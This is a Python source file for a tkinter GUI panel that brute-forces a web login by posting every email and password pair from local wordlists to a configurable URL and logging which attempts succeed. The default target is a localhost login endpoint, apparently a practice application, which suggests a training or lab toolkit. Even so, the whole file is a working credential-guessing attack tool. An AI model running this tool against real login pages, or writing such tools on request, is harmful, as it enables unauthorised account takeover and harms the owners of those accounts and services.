from tkinter import Frame, Label, Entry, Button, Text

import os
import requests


class Bruteforce(Frame):

    def __init__(self, parent, controller):

        Frame.__init__(self, parent)
        self.controller = controller

        Label(self, text="Login URL:").pack()
        self.login_url_entry = Entry(self)
        self.login_url_entry.pack()
        self.login_url_entry.insert("insert", "http://localhost:3000/rest/user/login")

        Label(self, text="Email field name:").pack()
        self.email_field_name_entry = Entry(self)
        self.email_field_name_entry.pack()
        self.email_field_name_entry.insert("insert", "email")

        Label(self, text="Password field name:").pack()
        self.password_field_name_entry = Entry(self)
        self.password_field_name_entry.pack()
        self.password_field_name_entry.insert("insert", "password")

        self.result_text = Text(self)
        self.result_text.pack()

        Button(self, text="Launch the attack", command=self.launch_attack).pack()

    def launch_attack(self):

        self.result_text.delete('1.0', 'end')

        self.result_text.insert('end', "---- START ----\n\n")

        directory_path = os.path.dirname(os.path.realpath(__file__))

        emails_path = os.path.join(directory_path, '../Resources/Bruteforce/emails.txt')
        passwords_path = os.path.join(directory_path, '../Resources/Bruteforce/password.txt')

        with open(emails_path, 'r') as f:
            emails = [line.strip() for line in f]

        with open(passwords_path, 'r') as f:
            passwords = [line.strip() for line in f]

        successes_counter = 0
        fails_counter = 0

        for email in emails:
            for password in passwords:
                data = {
                    self.email_field_name_entry.get(): email,
                    self.password_field_name_entry.get(): password
                }
                response = requests.post(self.login_url_entry.get(), data=data)
                if response.status_code == 200:
                    message = "Success"
                    successes_counter += 1
                else:
                    message = "Fail"
                    fails_counter += 1

                self.result_text.insert('end', f"{message} with username: {email}, password: {password}\n")

        self.result_text.insert('end', f"\nSummary:\nSuccesses: {successes_counter}\nFails: {fails_counter}\n")

        self.result_text.insert('end', "\n---- END ----")
